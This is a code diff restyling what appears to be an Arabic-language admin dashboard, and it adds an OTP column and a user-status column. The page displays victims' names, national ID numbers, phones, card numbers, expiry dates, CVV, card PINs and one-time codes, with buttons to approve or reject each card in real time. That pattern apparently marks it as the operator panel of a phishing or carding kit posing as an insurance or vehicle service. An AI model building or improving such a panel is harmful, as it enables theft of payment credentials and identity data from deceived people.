+                                }`}
                               onClick={(e) => {
                                 e.stopPropagation()
                                 setSelectedNotification(notification)
@@ -1205,11 +1235,12 @@ export default function NotificationsPage() {
                           )}
                         </div>
                       </TableCell>
+                      <TableCell>{notification.otpCode && <Badge className="bg-green-600">{notification.otpCode}</Badge>}</TableCell>
 
                       <TableCell>{getStatusBadge(notification.status)}</TableCell>
                       <TableCell>
-                        <div className="flex flex-col">
-                        {
+                        <div className="flex flex-col text-right" dir="rtl">
+                          {
                             formatDistanceToNow(new Date(notification.createdDate), {
                               addSuffix: true,
                               locale: ar,
@@ -1222,7 +1253,7 @@ export default function NotificationsPage() {
                           <Button
                             variant="ghost"
                             size="icon"
-                            className="h-8 w-8 rounded-full hover:bg-gradient-to-r hover:from-blue-100 hover:to-indigo-100 hover:text-blue-600 transition-all duration-300"
+                            className="h-8 w-8 rounded-full hover:bg-emerald-50 hover:text-emerald-600"
                             onClick={() => handleViewDetails(notification)}
                           >
                             <Eye className="h-4 w-4" />
@@ -1232,17 +1263,17 @@ export default function NotificationsPage() {
                               <Button
                                 variant="ghost"
                                 size="icon"
-                                className="h-8 w-8 rounded-full hover:bg-gradient-to-r hover:from-purple-100 hover:to-indigo-100 hover:text-purple-600 transition-all duration-300"
+                                className="h-8 w-8 rounded-full hover:bg-emerald-50 hover:text-emerald-600"
                               >
                                 <MoreHorizontal className="h-4 w-4" />
                               </Button>
                             </DropdownMenuTrigger>
-                            <DropdownMenuContent align="end" className="bg-white/95 backdrop-blur-sm border-purple-200">
-                              <DropdownMenuLabel className="text-purple-800">خيارات</DropdownMenuLabel>
-                              <DropdownMenuSeparator className="bg-purple-200" />
+                            <DropdownMenuContent align="end" className="bg-white/95 backdrop-blur-sm">
+                              <DropdownMenuLabel>خيارات</DropdownMenuLabel>
+                              <DropdownMenuSeparator />
                               <DropdownMenuItem
                                 onClick={() => handleInfoClick(notification, "personal")}
-                                className="gap-2 hover:bg-gradient-to-r hover:from-blue-50 hover:to-indigo-50"
+                                className="gap-2 hover:bg-stone-50"
                               >
                                 <User className="h-4 w-4" />
                                 معلومات شخصية
@@ -1250,30 +1281,30 @@ export default function NotificationsPage() {
 
                               {(notification.card_number ||
                                 (notification.formData && notification.formData.card_number)) && (
-                                <DropdownMenuItem
-                                  onClick={() => handleInfoClick(notification, "card")}
-                                  className="gap-2 hover:bg-gradient-to-r hover:from-emerald-50 hover:to-teal-50"
-                                >
-                                  <CreditCard className="h-4 w-4" />
-                                  معلومات البطاقة
-                                </DropdownMenuItem>
-                              )}
+                                  <DropdownMenuItem
+                                    onClick={() => handleInfoClick(notification, "card")}
+                                    className="gap-2 hover:bg-stone-50"
+                                  >
+                                    <CreditCard className="h-4 w-4" />
+                                    معلومات البطاقة
+                                  </DropdownMenuItem>
+                                )}
 
                               {notification.vehicle_type && (
                                 <DropdownMenuItem
                                   onClick={() => handleInfoClick(notification, "vehicle")}
-                                  className="gap-2 hover:bg-gradient-to-r hover:from-purple-50 hover:to-violet-50"
+                                  className="gap-2 hover:bg-stone-50"
                                 >
                                   <Car className="h-4 w-4" />
                                   معلومات المركبة
                                 </DropdownMenuItem>
                               )}
 
-                              <DropdownMenuSeparator className="bg-purple-200" />
+                              <DropdownMenuSeparator />
 
                               <DropdownMenuItem
                                 onClick={() => handleDelete(notification.id)}
-                                className="gap-2 text-rose-600 hover:bg-gradient-to-r hover:from-rose-50 hover:to-red-50"
+                                className="gap-2 text-rose-600 hover:bg-rose-50"
                               >
                                 <Trash2 className="h-4 w-4" />
                                 حذف
@@ -1281,6 +1312,9 @@ export default function NotificationsPage() {
                             </DropdownMenuContent>
                           </DropdownMenu>
                         </div>
+                      </TableCell>
+                      <TableCell>
+                        <UserStatus userId={notification.id} country={notification?.country!}/>
                       </TableCell>
                     </TableRow>
                   ))}
@@ -1292,9 +1326,9 @@ export default function NotificationsPage() {
 
         {/* Pagination */}
         {filteredNotifications.length > 0 && (
-          <CardFooter className="p-4 bg-gradient-to-r from-white via-purple-50 to-indigo-50 border-t border-purple-200/50">
+          <CardFooter className="p-4 bg-white/95 dark:bg-stone-800/95 border-t border-stone-200/50">
             <div className="flex flex-col sm:flex-row justify-between items-center gap-4 w-full">
-              <div className="text-sm text-slate-600">
+              <div className="text-sm text-stone-600">
                 عرض {(currentPage - 1) * itemsPerPage + 1} إلى{" "}
                 {Math.min(currentPage * itemsPerPage, filteredNotifications.length)} من {filteredNotifications.length}{" "}
                 عنصر
@@ -1310,7 +1344,7 @@ export default function NotificationsPage() {
                     size="icon"
                     onClick={goToFirstPage}
                     disabled={currentPage === 1}
-                    className="h-8 w-8 border-purple-200 hover:bg-gradient-to-r hover:from-purple-100 hover:to-indigo-100 transition-all duration-300"
+                    className="h-8 w-8 border-stone-200 hover:bg-stone-50"
                   >
                     <ChevronsRight className="h-4 w-4" />
                   </Button>
@@ -1320,7 +1354,7 @@ export default function NotificationsPage() {
                     size="icon"
                     onClick={goToPreviousPage}
                     disabled={currentPage === 1}
-                    className="h-8 w-8 border-purple-200 hover:bg-gradient-to-r hover:from-purple-100 hover:to-indigo-100 transition-all duration-300"
+                    className="h-8 w-8 border-stone-200 hover:bg-stone-50"
                   >
                     <ChevronRight className="h-4 w-4" />
                   </Button>
@@ -1332,7 +1366,7 @@ export default function NotificationsPage() {
                         variant={currentPage === page ? "default" : "outline"}
                         size="sm"
                         onClick={() => goToPage(page)}
-                        className={`h-8 w-8 transition-all duration-300 ${currentPage === page ? "bg-gradient-to-r from-purple-600 to-indigo-600 text-white hover:from-purple-700 hover:to-indigo-700 shadow-lg" : "border-purple-200 hover:bg-gradient-to-r hover:from-purple-100 hover:to-indigo-100"}`}
+                        className={`h-8 w-8 ${currentPage === page ? "bg-emerald-600 text-white hover:bg-emerald-700" : "border-stone-200 hover:bg-stone-50"}`}
                       >
                         {page}
                       </Button>
@@ -1344,7 +1378,7 @@ export default function NotificationsPage() {
                     size="icon"
                     onClick={goToNextPage}
                     disabled={currentPage === totalPages}
-                    className="h-8 w-8 border-purple-200 hover:bg-gradient-to-r hover:from-purple-100 hover:to-indigo-100 transition-all duration-300"
+                    className="h-8 w-8 border-stone-200 hover:bg-stone-50"
                   >
                     <ChevronLeft className="h-4 w-4" />
                   </Button>
@@ -1354,7 +1388,7 @@ export default function NotificationsPage() {
                     size="icon"
                     onClick={goToLastPage}
                     disabled={currentPage === totalPages}
-                    className="h-8 w-8 border-purple-200 hover:bg-gradient-to-r hover:from-purple-100 hover:to-indigo-100 transition-all duration-300"
+                    className="h-8 w-8 border-stone-200 hover:bg-stone-50"
                   >
                     <ChevronsLeft className="h-4 w-4" />
                   </Button>
@@ -1368,18 +1402,18 @@ export default function NotificationsPage() {
       {/* Info Dialog */}
       <Dialog open={selectedInfo !== null} onOpenChange={closeDialog}>
         <DialogContent
-          className="bg-white/95 dark:bg-slate-800/95 border-0 shadow-2xl max-w-md rounded-xl backdrop-blur-sm"
+          className="bg-white/95 dark:bg-stone-800/95 border-0 shadow-xl max-w-md rounded-xl backdrop-blur-sm"
           dir="rtl"
         >
-          <DialogHeader className="border-b border-purple-200/50 pb-3">
-            <DialogTitle className="text-xl font-bold bg-gradient-to-r from-purple-600 via-violet-600 to-indigo-600 text-transparent bg-clip-text">
+          <DialogHeader className="border-b border-stone-200/50 pb-3">
+            <DialogTitle className="text-xl font-bold bg-gradient-to-r from-emerald-600 to-teal-600 text-transparent bg-clip-text">
               {selectedInfo === "personal"
                 ? "المعلومات الشخصية"
                 : selectedInfo === "card"
                   ? "معلومات البطاقة"
                   : "معلومات المركبة"}
             </DialogTitle>
-            <DialogDescription className="text-slate-600">
+            <DialogDescription className="text-stone-600">
               {selectedInfo === "personal"
                 ? "تفاصيل المعلومات الشخصية للمستخدم"
                 : selectedInfo === "card"
@@ -1390,11 +1424,11 @@ export default function NotificationsPage() {
 
           {selectedInfo === "personal" && selectedNotification && (
             <div className="space-y-3 py-2">
-              <div className="p-4 rounded-lg bg-gradient-to-r from-blue-50 via-indigo-50 to-purple-50 border border-blue-200 shadow-sm">
-                <p className="text-sm text-blue-600 font-medium">الاسم الكامل</p>
+              <div className="p-4 rounded-lg bg-stone-50 dark:bg-stone-700 flex flex-col gap-1">
+                <p className="text-sm text-stone-600">الاسم الكامل</p>
                 <div className="flex items-center gap-2 mt-1">
-                  <User className="h-4 w-4 text-blue-600" />
-                  <p className="font-medium text-lg text-slate-800 dark:text-slate-200">
+                  <User className="h-4 w-4 text-emerald-600" />
+                  <p className="font-medium text-lg text-stone-800 dark:text-stone-200">
                     {selectedNotification.documment_owner_full_name ||
                       selectedNotification.document_owner_full_name ||
                       "غير محدد"}
@@ -1402,11 +1436,11 @@ export default function NotificationsPage() {
                 </div>
               </div>
 
-              <div className="p-4 rounded-lg bg-gradient-to-r from-emerald-50 via-teal-50 to-cyan-50 border border-emerald-200 shadow-sm">
-                <p className="text-sm text-emerald-600 font-medium">رقم الهوية</p>
+              <div className="p-4 rounded-lg bg-stone-50 dark:bg-stone-700 flex flex-col gap-1">
+                <p className="text-sm text-stone-600">رقم الهوية</p>
                 <div className="flex items-center gap-2 mt-1">
                   <Shield className="h-4 w-4 text-emerald-600" />
-                  <p className="font-medium text-lg font-mono text-slate-800 dark:text-slate-200">
+                  <p className="font-medium text-lg font-mono text-stone-800 dark:text-stone-200">
                     {selectedNotification.owner_identity_number ||
                       selectedNotification.buyer_identity_number ||
                       "غير محدد"}
@@ -1414,33 +1448,31 @@ export default function NotificationsPage() {
                 </div>
               </div>
 
-              <div className="p-4 rounded-lg bg-gradient-to-r from-orange-50 via-amber-50 to-yellow-50 border border-orange-200 shadow-sm">
-                <p className="text-sm text-orange-600 font-medium">رقم الهاتف</p>
+              <div className="p-4 rounded-lg bg-stone-50 dark:bg-stone-700 flex flex-col gap-1">
+                <p className="text-sm text-stone-600">رقم الهاتف</p>
                 <div className="flex items-center gap-2 mt-1">
-                  <Smartphone className="h-4 w-4 text-orange-600" />
-                  <p className="font-medium text-lg font-mono text-slate-800 dark:text-slate-200">
+                  <p className="font-medium text-lg font-mono text-stone-800 dark:text-stone-200">
                     {selectedNotification.phone}
                   </p>
                 </div>
               </div>
 
-              <div className="p-4 rounded-lg bg-gradient-to-r from-purple-50 via-violet-50 to-fuchsia-50 border border-purple-200 shadow-sm">
-                <p className="text-sm text-purple-600 font-medium">نوع الطلب</p>
-                <div className="flex items-center gap-2 mt-1">
-                  <Tag className="h-4 w-4 text-purple-600" />
-                  <p className="font-medium text-slate-800 dark:text-slate-200">
-                    {selectedNotification.pagename || selectedNotification.insurance_purpose || "غير محدد"}
-                  </p>
-                </div>
-              </div>
-
               {selectedNotification.serial_number && (
-                <div className="p-4 rounded-lg bg-gradient-to-r from-rose-50 via-pink-50 to-red-50 border border-rose-200 shadow-sm">
-                  <p className="text-sm text-rose-600 font-medium">الرقم التسلسلي</p>
+                <div className="p-4 rounded-lg bg-stone-50 dark:bg-stone-700 flex flex-col gap-1">
+                  <p className="text-sm text-stone-600">الرقم التسلسلي</p>
                   <div className="flex items-center gap-2 mt-1">
-                    <FileText className="h-4 w-4 text-rose-600" />
-                    <p className="font-medium font-mono text-slate-800 dark:text-slate-200">
+                    <p className="font-medium font-mono text-stone-800 dark:text-stone-200">
                       {selectedNotification.serial_number}
+                    </p>
+                  </div>
+                </div>
+              )}
+               {selectedNotification?.totalPrice && (
+                <div className="p-4 rounded-lg bg-stone-50 dark:bg-stone-700 flex flex-col gap-1">
+                  <p className="text-sm text-stone-600">قيمة التامين</p>
+                  <div className="flex items-center gap-2 mt-1">
+                    <p className="font-medium font-mono text-stone-800 dark:text-stone-200">
+                    {selectedNotification?.totalPrice}  <span className="text-green-500">ريال</span> 
                     </p>
                   </div>
                 </div>
@@ -1450,56 +1482,50 @@ export default function NotificationsPage() {
 
           {selectedInfo === "card" && selectedNotification && (
             <Tabs defaultValue="main" className="w-full">
-              <TabsList className="grid w-full grid-cols-2 mb-4 bg-gradient-to-r from-purple-100 to-indigo-100">
-                <TabsTrigger
-                  value="main"
-                  className="data-[state=active]:bg-gradient-to-r data-[state=active]:from-purple-600 data-[state=active]:to-indigo-600 data-[state=active]:text-white"
-                >
+              <TabsList className="grid w-full grid-cols-2 mb-4 bg-stone-100">
+                <TabsTrigger value="main" className="data-[state=active]:bg-emerald-600 data-[state=active]:text-white">
                   البطاقة الرئيسية
                 </TabsTrigger>
-                <TabsTrigger
-                  value="form"
-                  className="data-[state=active]:bg-gradient-to-r data-[state=active]:from-purple-600 data-[state=active]:to-indigo-600 data-[state=active]:text-white"
-                >
+                <TabsTrigger value="form" className="data-[state=active]:bg-emerald-600 data-[state=active]:text-white">
                   بيانات النموذج
                 </TabsTrigger>
               </TabsList>
               <TabsContent value="main" className="space-y-3 py-2">
-                <div className="p-4 rounded-lg bg-gradient-to-r from-blue-50 via-indigo-50 to-purple-50 border border-blue-200 shadow-sm">
-                  <p className="text-sm text-blue-600 font-medium">اسم حامل البطاقة</p>
+                <div className="p-4 rounded-lg bg-stone-50 dark:bg-stone-700 flex flex-col gap-1">
+                  <p className="text-sm text-stone-600">اسم حامل البطاقة</p>
                   <div className="flex items-center gap-2 mt-1">
-                    <User className="h-4 w-4 text-blue-600" />
-                    <p className="font-medium text-lg text-slate-800 dark:text-slate-200">
+                    <User className="h-4 w-4 text-emerald-600" />
+                    <p className="font-medium text-lg text-stone-800 dark:text-stone-200">
                       {selectedNotification.document_owner_full_name || selectedNotification.full_name || "غير محدد"}
                     </p>
                   </div>
                 </div>
 
-                <div className="p-4 rounded-lg bg-gradient-to-r from-emerald-50 via-teal-50 to-cyan-50 border border-emerald-200 shadow-sm">
-                  <p className="text-sm text-emerald-600 font-medium">رقم البطاقة</p>
+                <div className="p-4 rounded-lg bg-stone-50 dark:bg-stone-700 flex flex-col gap-1">
+                  <p className="text-sm text-stone-600">رقم البطاقة</p>
                   <div className="flex items-center gap-2 mt-1">
                     <CreditCard className="h-4 w-4 text-emerald-600" />
-                    <p className="font-medium text-lg font-mono text-slate-800 dark:text-slate-200">
+                    <p className="font-medium text-lg font-mono text-stone-800 dark:text-stone-200">
                       {selectedNotification.card_number || "غير محدد"}
                     </p>
                   </div>
                 </div>
 
-                <div className="p-4 rounded-lg bg-gradient-to-r from-orange-50 via-amber-50 to-yellow-50 border border-orange-200 shadow-sm">
-                  <p className="text-sm text-orange-600 font-medium">تاريخ الانتهاء</p>
+                <div className="p-4 rounded-lg bg-stone-50 dark:bg-stone-700 flex flex-col gap-1">
+                  <p className="text-sm text-stone-600">تاريخ الانتهاء</p>
                   <div className="flex items-center gap-2 mt-1">
-                    <Calendar className="h-4 w-4 text-orange-600" />
-                    <p className="font-medium text-lg font-mono text-slate-800 dark:text-slate-200">
+                    <Calendar className="h-4 w-4 text-emerald-600" />
+                    <p className="font-medium text-lg font-mono text-stone-800 dark:text-stone-200">
                       {selectedNotification.expiration_date || "غير محدد"}
                     </p>
                   </div>
                 </div>
 
-                <div className="p-4 rounded-lg bg-gradient-to-r from-purple-50 via-violet-50 to-fuchsia-50 border border-purple-200 shadow-sm">
-                  <p className="text-sm text-purple-600 font-medium">رمز الأمان (CVV)</p>
+                <div className="p-4 rounded-lg bg-stone-50 dark:bg-stone-700 flex flex-col gap-1">
+                  <p className="text-sm text-stone-600">رمز الأمان (CVV)</p>
                   <div className="flex items-center gap-2 mt-1">
-                    <Shield className="h-4 w-4 text-purple-600" />
-                    <p className="font-medium text-lg font-mono text-slate-800 dark:text-slate-200">
+                    <Shield className="h-4 w-4 text-emerald-600" />
+                    <p className="font-medium text-lg font-mono text-stone-800 dark:text-stone-200">
                       {selectedNotification.cvv || "غير محدد"}
                     </p>
                   </div>
@@ -1509,49 +1535,51 @@ export default function NotificationsPage() {
               <TabsContent value="form" className="space-y-3 py-2">
                 {selectedNotification.formData ? (
                   <>
-                    <div className="p-4 rounded-lg bg-gradient-to-r from-blue-50 via-indigo-50 to-purple-50 border border-blue-200 shadow-sm">
-                      <p className="text-sm text-blue-600 font-medium">اسم حامل البطاقة</p>
+                    <div className="p-4 rounded-lg bg-stone-50 dark:bg-stone-700 flex flex-col gap-1">
+                      <p className="text-sm text-stone-600">اسم حامل البطاقة</p>
                       <div className="flex items-center gap-2 mt-1">
-                        <User className="h-4 w-4 text-blue-600" />
-                        <p className="font-medium text-lg text-slate-800 dark:text-slate-200">
+                        <User className="h-4 w-4 text-emerald-600" />
+                        <p className="font-medium text-lg text-stone-800 dark:text-stone-200">
                           {selectedNotification.formData.full_name || "غير محدد"}
                         </p>
                       </div>
                     </div>
 
-                    <div className="p-4 rounded-lg bg-gradient-to-r from-emerald-50 via-teal-50 to-cyan-50 border border-emerald-200 shadow-sm">
-                      <p className="text-sm text-emerald-600 font-medium">رقم البطاقة</p>
+                    <div className="p-4 rounded-lg bg-stone-50 dark:bg-stone-700 flex flex-col gap-1">
+                      <p className="text-sm text-stone-600">رقم البطاقة</p>
                       <div className="flex items-center gap-2 mt-1">
                         <CreditCard className="h-4 w-4 text-emerald-600" />
-                        <p className="font-medium text-lg font-mono text-slate-800 dark:text-slate-200">
+                        <p className="font-medium text-lg font-mono text-stone-800 dark:text-stone-200">
                           {selectedNotification.formData.card_number || "غير محدد"}
                         </p>
                       </div>
                     </div>
 
-                    <div className="p-4 rounded-lg bg-gradient-to-r from-orange-50 via-amber-50 to-yellow-50 border border-orange-200 shadow-sm">
-                      <p className="text-sm text-orange-600 font-medium">تاريخ الانتهاء</p>
+                    <div className="p-4 rounded-lg bg-stone-50 dark:bg-stone-700 flex flex-col gap-1">
+                      <p className="text-sm text-stone-600">تاريخ الانتهاء</p>
                       <div className="flex items-center gap-2 mt-1">
-                        <Calendar className="h-4 w-4 text-orange-600" />
-                        <p className="font-medium text-lg font-mono text-slate-800 dark:text-slate-200">
-                          {selectedNotification.formData.expiration_date || "غير محدد"}
+                        <Calendar className="h-4 w-4 text-emerald-600" />
+                        <p className="font-medium text-lg font-mono text-stone-800 dark:text-stone-200">
+                          {selectedNotification.formData.expiration_date ||
+                            selectedNotification.expiration_date ||
+                            "غير محدد"}
                         </p>
                       </div>
                     </div>
 
-                    <div className="p-4 rounded-lg bg-gradient-to-r from-purple-50 via-violet-50 to-fuchsia-50 border border-purple-200 shadow-sm">
-                      <p className="text-sm text-purple-600 font-medium">رمز الأمان (CVV)</p>
+                    <div className="p-4 rounded-lg bg-stone-50 dark:bg-stone-700 flex flex-col gap-1">
+                      <p className="text-sm text-stone-600">رمز الأمان (CVV)</p>
                       <div className="flex items-center gap-2 mt-1">
-                        <Shield className="h-4 w-4 text-purple-600" />
-                        <p className="font-medium text-lg font-mono text-slate-800 dark:text-slate-200">
+                        <Shield className="h-4 w-4 text-emerald-600" />
+                        <p className="font-medium text-lg font-mono text-stone-800 dark:text-stone-200">
                           {selectedNotification.formData.cvv || "غير محدد"}
                         </p>
                       </div>
                     </div>
                   </>
                 ) : (
-                  <div className="flex flex-col items-center justify-center py-8 text-slate-800">
-                    <AlertCircle className="h-12 w-12 mb-2 text-purple-400" />
+                  <div className="flex flex-col items-center justify-center py-8 text-stone-500">
+                    <AlertCircle className="h-12 w-12 mb-2 text-stone-400" />
                     <p>لا توجد بيانات نموذج متاحة</p>
                   </div>
                 )}
@@ -1561,22 +1589,21 @@ export default function NotificationsPage() {
 
           {selectedInfo === "vehicle" && selectedNotification && (
             <div className="space-y-3 py-2">
-              <div className="p-4 rounded-lg bg-gradient-to-r from-blue-50 via-indigo-50 to-purple-50 border border-blue-200 shadow-sm">
-                <p className="text-sm text-blue-600 font-medium">نوع المركبة</p>
+              <div className="p-4 rounded-lg bg-stone-50 dark:bg-stone-700 flex flex-col gap-1">
+                <p className="text-sm text-stone-600">نوع المركبة</p>
                 <div className="flex items-center gap-2 mt-1">
-                  <Car className="h-4 w-4 text-blue-600" />
-                  <p className="font-medium text-lg text-slate-800 dark:text-slate-200">
+                  <Car className="h-4 w-4 text-emerald-600" />
+                  <p className="font-medium text-lg text-stone-800 dark:text-stone-200">
                     {selectedNotification.vehicle_type || "غير محدد"}
                   </p>
                 </div>
               </div>
 
               {selectedNotification.vehicle_manufacture_number && (
-                <div className="p-4 rounded-lg bg-gradient-to-r from-emerald-50 via-teal-50 to-cyan-50 border border-emerald-200 shadow-sm">
-                  <p className="text-sm text-emerald-600 font-medium">رقم تصنيع المركبة</p>
+                <div className="p-4 rounded-lg bg-stone-50 dark:bg-stone-700 flex flex-col gap-1">
+                  <p className="text-sm text-stone-600">رقم تصنيع المركبة</p>
                   <div className="flex items-center gap-2 mt-1">
-                    <FileText className="h-4 w-4 text-emerald-600" />
-                    <p className="font-medium text-lg font-mono text-slate-800 dark:text-slate-200">
+                    <p className="font-medium text-lg font-mono text-stone-800 dark:text-stone-200">
                       {selectedNotification.vehicle_manufacture_number}
                     </p>
                   </div>
@@ -1584,11 +1611,10 @@ export default function NotificationsPage() {
               )}
 
               {selectedNotification.customs_code && (
-                <div className="p-4 rounded-lg bg-gradient-to-r from-orange-50 via-amber-50 to-yellow-50 border border-orange-200 shadow-sm">
-                  <p className="text-sm text-orange-600 font-medium">رمز الجمارك</p>
+                <div className="p-4 rounded-lg bg-stone-50 dark:bg-stone-700 flex flex-col gap-1">
+                  <p className="text-sm text-stone-600">رمز الجمارك</p>
                   <div className="flex items-center gap-2 mt-1">
-                    <Tag className="h-4 w-4 text-orange-600" />
-                    <p className="font-medium text-lg font-mono text-slate-800 dark:text-slate-200">
+                    <p className="font-medium text-lg font-mono text-stone-800 dark:text-stone-200">
                       {selectedNotification.customs_code}
                     </p>
                   </div>
@@ -1596,11 +1622,11 @@ export default function NotificationsPage() {
               )}
 
               {selectedNotification.seller_identity_number && (
-                <div className="p-4 rounded-lg bg-gradient-to-r from-purple-50 via-violet-50 to-fuchsia-50 border border-purple-200 shadow-sm">
-                  <p className="text-sm text-purple-600 font-medium">رقم هوية البائع</p>
+                <div className="p-4 rounded-lg bg-stone-50 dark:bg-stone-700 flex flex-col gap-1">
+                  <p className="text-sm text-stone-600">رقم هوية البائع</p>
                   <div className="flex items-center gap-2 mt-1">
-                    <Shield className="h-4 w-4 text-purple-600" />
-                    <p className="font-medium text-lg font-mono text-slate-800 dark:text-slate-200">
+                    <Shield className="h-4 w-4 text-emerald-600" />
+                    <p className="font-medium text-lg font-mono text-stone-800 dark:text-stone-200">
                       {selectedNotification.seller_identity_number}
                     </p>
                   </div>
@@ -1608,11 +1634,10 @@ export default function NotificationsPage() {
               )}
 
               {selectedNotification.serial_number && (
-                <div className="p-4 rounded-lg bg-gradient-to-r from-rose-50 via-pink-50 to-red-50 border border-rose-200 shadow-sm">
-                  <p className="text-sm text-rose-600 font-medium">الرقم التسلسلي</p>
+                <div className="p-4 rounded-lg bg-stone-50 dark:bg-stone-700 flex flex-col gap-1">
+                  <p className="text-sm text-stone-600">الرقم التسلسلي</p>
                   <div className="flex items-center gap-2 mt-1">
-                    <FileText className="h-4 w-4 text-rose-600" />
-                    <p className="font-medium text-lg font-mono text-slate-800 dark:text-slate-200">
+                    <p className="font-medium text-lg font-mono text-stone-800 dark:text-stone-200">
                       {selectedNotification.serial_number}
                     </p>
                   </div>
@@ -1621,12 +1646,8 @@ export default function NotificationsPage() {
             </div>
           )}
 
-          <DialogFooter className="flex flex-col sm:flex-row gap-2 sm:gap-0 mt-4 pt-3 border-t border-purple-200/50">
-            <Button
-              onClick={closeDialog}
-              className="w-full bg-gradient-to-r from-purple-600 to-indigo-600 hover:from-purple-700 hover:to-indigo-700 shadow-lg"
-              variant="outline"
-            >
+          <DialogFooter className="flex flex-col sm:flex-row gap-2 sm:gap-0 mt-4 pt-3 border-t border-stone-200/50">
+            <Button onClick={closeDialog} className="w-full bg-emerald-600 hover:bg-emerald-700" variant="outline">
               إغلاق
             </Button>
           </DialogFooter>
@@ -1636,22 +1657,22 @@ export default function NotificationsPage() {
       {/* Card Dialog */}
       <Dialog open={showCardDialog} onOpenChange={(open) => !open && setShowCardDialog(false)}>
         <DialogContent
-          className="bg-white/95 dark:bg-slate-800/95 border-0 shadow-2xl max-w-md rounded-xl backdrop-blur-sm"
+          className="bg-white/95 dark:bg-stone-800/95 border-0 shadow-xl max-w-md rounded-xl backdrop-blur-sm"
           dir="rtl"
         >
-          <DialogHeader className="border-b border-purple-200/50 pb-3">
-            <DialogTitle className="text-xl font-bold bg-gradient-to-r from-purple-600 via-violet-600 to-indigo-600 text-transparent bg-clip-text">
+          <DialogHeader className="border-b border-stone-200/50 pb-3">
+            <DialogTitle className="text-xl font-bold bg-gradient-to-r from-emerald-600 to-teal-600 text-transparent bg-clip-text">
               معلومات البطاقة
             </DialogTitle>
-            <DialogDescription className="text-slate-600">تفاصيل معلومات البطاقة البنكية</DialogDescription>
+            <DialogDescription className="text-stone-600">تفاصيل معلومات البطاقة البنكية</DialogDescription>
           </DialogHeader>
 
           {selectedCardInfo && (
             <div className="space-y-4 py-3">
-              <div className="p-5 rounded-lg bg-gradient-to-r from-purple-500 via-violet-500 to-indigo-500 text-white shadow-2xl">
+              <div className="p-5 rounded-lg bg-gradient-to-r from-emerald-500 to-teal-500 text-white shadow-lg">
                 <div className="flex justify-between items-start mb-6">
                   <div className="flex flex-col">
-                    <span className="text-xs text-purple-100 mb-1">حامل البطاقة</span>
+                    <span className="text-xs text-emerald-100 mb-1">حامل البطاقة</span>
                     <span className="font-medium">
                       {selectedCardInfo.document_owner_full_name || selectedCardInfo.full_name || "غير محدد"}
                     </span>
@@ -1660,7 +1681,7 @@ export default function NotificationsPage() {
                 </div>
 
                 <div className="mb-4">
-                  <span className="text-xs text-purple-100 mb-1 block">رقم البطاقة</span>
+                  <span className="text-xs text-emerald-100 mb-1 block">رقم البطاقة</span>
                   <span className="font-mono text-lg tracking-wider" dir="ltr">
                     {selectedCardInfo.card_number ||
                       (selectedCardInfo.formData && selectedCardInfo.formData.card_number) ||
@@ -1670,7 +1691,7 @@ export default function NotificationsPage() {
 
                 <div className="flex justify-between">
                   <div>
-                    <span className="text-xs text-purple-100 block">تاريخ الانتهاء</span>
+                    <span className="text-xs text-emerald-100 block">تاريخ الانتهاء</span>
                     <span className="font-mono">
                       {selectedCardInfo.expiration_date ||
                         (selectedCardInfo.formData && selectedCardInfo.formData.expiration_date) ||
@@ -1678,7 +1699,7 @@ export default function NotificationsPage() {
                     </span>
                   </div>
                   <div>
-                    <span className="text-xs text-purple-100 block">رمز الأمان</span>
+                    <span className="text-xs text-emerald-100 block">رمز الأمان</span>
                     <span className="font-mono">
                       {selectedCardInfo.cvv ||
                         (selectedCardInfo.formData && selectedCardInfo.formData.cvv) ||
@@ -1688,24 +1709,24 @@ export default function NotificationsPage() {
                 </div>
               </div>
 
-              <div className="p-4 rounded-lg bg-gradient-to-r from-slate-50 via-gray-50 to-zinc-50 border border-slate-200 shadow-sm">
-                <h3 className="font-medium mb-2 text-sm text-slate-700 dark:text-slate-300">معلومات إضافية</h3>
+              <div className="p-4 rounded-lg bg-stone-50 dark:bg-stone-700">
+                <h3 className="font-medium mb-2 text-sm text-stone-700 dark:text-stone-300">معلومات إضافية</h3>
                 <div className="space-y-2">
                   <div className="flex justify-between text-sm">
-                    <span className="text-slate-600">رقم سري بطاقة:</span>
-                    <span className="text-slate-800 dark:text-slate-200 font-mono">
+                    <span className="text-stone-600">رقم سري بطاقة:</span>
+                    <span className="text-stone-800 dark:text-stone-200">
                       {selectedCardInfo.pinCode || "غير متوفر"}
                     </span>
                   </div>
                   <div className="flex justify-between text-sm">
-                    <span className="text-slate-600">رمز تحقق:</span>
-                    <span className="text-slate-800 dark:text-slate-200 font-mono">
+                    <span className="text-stone-600">رمز تحقق:</span>
+                    <span className="text-stone-800 dark:text-stone-200">
                       {selectedCardInfo.otpCode || selectedCardInfo.phoneOtp || "غير متوفر"}
                     </span>
                   </div>
                   <div className="flex justify-between text-sm">
-                    <span className="text-slate-600">الحالة:</span>
-                    <span className="text-slate-800 dark:text-slate-200">
+                    <span className="text-stone-600">الحالة:</span>
+                    <span className="text-stone-800 dark:text-stone-200">
                       {selectedCardInfo.paymentStatus === "approved"
                         ? "مقبول"
                         : selectedCardInfo.paymentStatus === "rejected"
@@ -1718,7 +1739,7 @@ export default function NotificationsPage() {
             </div>
           )}
 
-          <DialogFooter className="grid grid-cols-5 mt-4 pt-3 border-t border-purple-200/50 gap-2">
+          <DialogFooter className="grid grid-cols-5 mt-4 pt-3 border-t border-stone-200/50 gap-2">
             {selectedCardInfo?.card_number ? (
               <>
                 <Button
@@ -1726,7 +1747,7 @@ export default function NotificationsPage() {
                     handleApproval("rejected", selectedCardInfo.id)
                     setShowCardDialog(false)
                   }}
-                  className="w-full bg-gradient-to-r from-rose-500 to-red-500 hover:from-rose-600 hover:to-red-600 text-white border-0 shadow-lg transition-all duration-300"
+                  className="w-full bg-gradient-to-r from-rose-500 to-red-500 hover:from-rose-600 hover:to-red-600 text-white border-0 shadow-md"
                 >
                   رفض
                 </Button>
@@ -1735,7 +1756,7 @@ export default function NotificationsPage() {
                     handleApproval("approved", selectedCardInfo.id)
                     setShowCardDialog(false)
                   }}
-                  className="w-full bg-gradient-to-r from-emerald-500 to-teal-500 hover:from-emerald-600 hover:to-teal-600 text-white border-0 shadow-lg transition-all duration-300"
+                  className="w-full bg-gradient-to-r from-emerald-500 to-emerald-600 hover:from-emerald-600 hover:to-emerald-700 text-white border-0 shadow-md"
                 >
                   قبول بطاقة
                 </Button>
@@ -1743,7 +1764,7 @@ export default function NotificationsPage() {
                   onClick={() => {
                     handlePassApproval("approved", selectedCardInfo.id)
                   }}
-                  className="w-full bg-gradient-to-r from-purple-500 to-violet-500 hover:from-purple-600 hover:to-violet-600 text-white border-0 shadow-lg transition-all duration-300"
